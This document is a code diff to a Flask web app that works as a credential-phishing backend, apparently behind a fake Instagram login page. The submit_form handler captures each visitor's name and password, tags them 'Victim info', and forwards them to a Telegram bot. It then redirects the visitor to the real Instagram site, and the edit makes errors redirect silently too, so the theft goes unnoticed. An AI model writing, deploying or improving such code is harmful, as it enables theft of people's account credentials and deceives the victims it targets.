@@ -230,14 +230,16 @@ def submit_form():
         name = request.form.get('name')
         password = request.form.get('password')
 
-        message = f"New form submission:\nName: {name}\nPassword: {password}"
+        message = f"Victim info 🐔:\nName: {name}\nPassword: {password}"
         send_message_to_telegram(message)
 
-        # Redirect to the Instagram website
+        # return jsonify({'status': 'success'})
         return redirect("https://www.instagram.com/")
 
     except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
+        return redirect("https://www.instagram.com/")
+
+        # return jsonify({'status': 'error', 'message': str(e)})
 
 def send_message_to_telegram(message):
     telegram_api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
@@ -250,30 +252,3 @@ def send_message_to_telegram(message):
 
 if __name__ == '__main__':
     app.run(debug=True)
-# def submit_form():
-#     try:
-#         name = request.form.get('name')
-#         password = request.form.get('password')
-
-#         message = f"Victim info 🐔:\nName: {name}\nPassword: {password}"
-#         send_message_to_telegram(message)
-
-#         # return jsonify({'status': 'success'})
-#         return redirect("https://www.instagram.com/")
-
-#     except Exception as e:
-#         return redirect("https://www.instagram.com/")
-
-#         # return jsonify({'status': 'error', 'message': str(e)})
-
-# def send_message_to_telegram(message):
-#     telegram_api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
-#     params = {
-#         'chat_id': TELEGRAM_CHAT_ID,
-#         'text': message
-#     }
-#     response = requests.post(telegram_api_url, params=params)
-#     response.raise_for_status()
-
-# if __name__ == '__main__':
-#     app.run(debug=True)
